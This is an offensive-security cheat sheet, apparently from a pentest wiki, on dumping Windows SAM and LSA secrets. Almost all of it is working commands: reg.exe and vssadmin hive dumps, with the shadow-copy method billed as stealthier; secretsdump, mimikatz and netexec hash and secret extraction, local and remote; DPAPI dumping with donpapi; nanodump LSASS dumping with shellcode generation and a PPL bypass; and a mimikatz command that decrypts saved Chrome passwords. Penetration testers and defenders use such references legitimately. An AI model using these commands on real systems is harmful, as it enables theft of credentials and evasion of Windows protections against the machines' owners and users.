---
title: "SAM & LSA secrets"
---

# 🔓 SAM & LSA secrets

| Hive            | Content                                                   |
| --------------- | --------------------------------------------------------- |
| `HKLM\SAM`      | Password hashes for local user accounts                   |
| `HKLM\SYSTEM`   | System boot key (decrypts SAM and SECURITY)               |
| `HKLM\SECURITY` | LSA secrets (DCC2 cache, cleartext passwords, DPAPI keys) |

## Dump methods

### reg.exe (live system)

```cmd
reg.exe save hklm\sam C:\sam
reg.exe save hklm\system C:\system
reg.exe save hklm\security C:\security
```

### vssadmin (shadow copy - more stealth)

```cmd
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyX\Windows\System32\config\SAM C:\sam
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyX\Windows\System32\config\SYSTEM C:\system
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyX\Windows\System32\config\SECURITY C:\security
```

### Check if PPL is enabled (blocks SECURITY reading)

```powershell
Get-Process lsass | Select-Object ProcessName, @{Name='Protected';Expression={$_.ProtectedProcess}}
```

## Extract credentials

### secretsdump (impacket)

::: code-group

```bash [secretsdump]
secretsdump -sam sam -system system -security security LOCAL
```

```bash [mimikatz]
mimikatz # privilege::debug
mimikatz # lsadump::sam
mimikatz # lsadump::secrets
```

```bash [nxc]
# Remote dumping
netexec smb $TARGETS -d $DOMAIN -u $USER -p $PASSWORD --sam/--lsa

# Local User Authentication
nxc smb $TARGET -d $DOMAIN --local-auth -u $USER -p $PASSWORD --sam/--lsa
```

:::

## DPAPI extraction

::: code-group

```bash [donpapi]
# Remote
donpapi dump --target $TARGET --username $DOMAIN\\$USER --password $PASSWORD

# Local
donpapi dump --local

# LSA secrets only
donpapi lsa --target 192.168.1.10 -u CORP\\jsmith -p P@ssw0rd
```

```bash [nanodump]
# Generate shellcode
donut -f nanodump.x64.exe -o payload.bin -a 2

# Or use the loader directly (if you have execution)
nanodump.x64.exe --write C:\temp\lsass.dmp

# With PPL bypass (requires driver)
nanodump.x64.exe --ppl --write lsass.dmp
```

```bash [impacket (dpapi.py)]
dpapi.py masterkey -file /path/to/key
```

```bash [mimikatz]
mimikatz # dpapi::chrome /in:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect
```

:::
